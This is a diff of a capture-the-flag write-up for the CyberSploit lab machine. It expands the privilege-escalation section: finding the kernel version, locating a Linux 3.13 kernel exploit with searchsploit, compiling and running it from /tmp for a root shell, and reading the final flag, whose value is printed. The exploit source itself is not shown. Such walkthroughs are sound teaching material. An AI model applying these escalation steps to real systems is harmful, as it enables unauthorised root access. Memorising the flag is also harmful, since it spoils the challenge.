@@ -230,32 +230,90 @@ We have found second flag as some compinations on 0101 it represents binary. Let
 
 **5. Privilege Escalation – User to Root**
 
-Now, escalate privileges to the `root` user to find the final flag.
-
-Lets check the kernal version with command `uname -a`
+To elevate privileges to the `root` user and locate the final flag, we first checked the kernel version using the command `uname -a`:
 
 ```bash
 itsskv@cybersploit-CTF:~$ uname -a
 Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
 ```
-lets check any exploit avalible on searchsploit 
 
-{command of check the exploit on searchsploit using kernal version}
+With this information, we then searched for potential exploits on Exploit-DB using `searchsploit` to identify a suitable exploit. The search led us to an exploit applicable to the Linux kernel version `3.13.0`. 
 
-### Additional Tips
+![Screenshot from 2024-04-13 13-02-29](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/a3054dc5-dc99-47aa-9d10-a2a2c5413709)
 
-- Experiment with tools like CyberChef for decoding encoded data.
-- Utilize Exploit-DB to search for specific vulnerabilities.
 
-Following this structured approach will help in capturing the three flags and learning about encoder-decoder techniques and Exploit-DB.
+We copied the exploit code and saved it in the `/tmp` directory as `exploit.c`.
 
-Enjoy the journey of learning and exploring cybersecurity!
+```bash
+itsskv@cybersploit-CTF:/tmp$ nano exploit.c
+```
 
-### Sources & Tools Used
+Choosing the `/tmp` directory for this purpose is strategic because it typically has permissions that allow for file creation and execution by users, making it a common location for staging files during exploitation.
 
-- **Nmap:** Network scanner for discovering target IP and running services.
-- **CyberChef:** Tool for encoding and decoding data. [CyberChef](https://gchq.github.io/CyberChef/)
-- **Dirsearch:** Web path scanner.
-- **Cryptii:** Binary decoder tool. [Cryptii Binary Decoder](https://cryptii.com/pipes/binary-decoder)
-- **Exploit-DB:** Database of exploits and vulnerabilities.
+After saving the exploit code, we compiled it using `gcc` and granted execution permissions to the resulting binary file using `chmod +x`:
 
+```bash
+itsskv@cybersploit-CTF:/tmp$ gcc exploit.c -o exploit
+itsskv@cybersploit-CTF:/tmp$ chmod +x exploit
+```
+
+Executing the compiled exploit triggered the exploitation process, which involved spawning threads, mounting, and creating necessary files such as `/etc/ld.so.preload` and a shared library, ultimately granting us `root` access:
+
+```bash
+itsskv@cybersploit-CTF:/tmp$ ./exploit 
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# 
+```
+
+With `root` access achieved, we navigated to the `/root` directory to locate and read the final flag:
+
+```bash
+# cd /root
+# ls
+finalflag.txt
+# cat finalflag.txt
+  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
+ /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
+|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
+|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
+|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
+ \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
+
+   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
+  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
+ ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
+  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
+
+flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
+
+if you like it share with me https://twitter.com/cybersploit1.
+
+Thanks !
+# 
+```
+
+We successfully located the final flag (`flag3`) in the `/root` directory and extracted it, obtaining the message:
+
+```
+flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
+```
+
+This concludes the process of privilege escalation and flag retrieval. Feel free to share your experience on Twitter with `@cybersploit1`. Congratulations on completing the challenge!
+
+### Key Commands Explained
+
+- `uname -a`: Displays system information, including the kernel version.
+- `searchsploit`: A utility to search for exploits in the Exploit-DB database.
+- `gcc exploit.c -o exploit`: Compiles the C source code (`exploit.c`) into an executable named `exploit`.
+- `chmod +x exploit`: Grants execute permissions to the compiled exploit binary.
+- `./exploit`: Executes the compiled exploit, triggering the privilege escalation process.
+- `cd /root`: Changes directory to the root user's home directory.
+- `ls`: Lists the contents of the current directory.
+- `cat finalflag.txt`: Displays the contents of the `finalflag.txt` file, revealing the final flag.
+
+By following these steps and understanding each command's purpose, you can gain valuable insights into the process of privilege escalation and exploit execution. Enjoy your exploration of cybersecurity!
